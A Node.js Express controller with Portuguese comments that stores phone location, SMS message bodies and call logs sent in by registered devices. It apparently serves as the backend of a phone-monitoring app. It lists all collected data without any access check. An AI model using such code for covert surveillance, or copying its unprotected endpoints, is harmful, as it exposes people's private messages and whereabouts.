const Device = require('../models/Device');

exports.registerDevice = async (req, res) => {
    try {
        const { deviceId } = req.body;
        
        let device = await Device.findOne({ deviceId });
        if (!device) {
            device = new Device({ deviceId });
            await device.save();
        }
        
        res.status(200).json(device);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};

exports.updateDeviceData = async (req, res) => {
    try {
        const { deviceId, location, sms, calls } = req.body;
        
        const device = await Device.findOne({ deviceId });
        if (!device) return res.status(404).json({ error: 'Dispositivo não encontrado' });

        // Atualizar localização
        if (location) {
            device.lastLocation = {
                lat: location.lat,
                lng: location.lng,
                timestamp: new Date(location.time)
            };
        }

        // Adicionar SMS
        if (sms && sms.length > 0) {
            device.sms = [...device.sms, ...sms.map(s => ({
                sender: s.sender,
                message: s.body,
                timestamp: new Date(s.date)
            }))];
        }

        // Adicionar chamadas
        if (calls && calls.length > 0) {
            device.calls = [...device.calls, ...calls.map(c => ({
                number: c.number,
                duration: c.duration,
                timestamp: new Date(c.date)
            }))];
        }

        device.lastActive = new Date();
        await device.save();
        
        res.status(200).json({ message: 'Dados atualizados' });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};

exports.getDevices = async (req, res) => {
    try {
        const devices = await Device.find();
        res.status(200).json(devices);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};
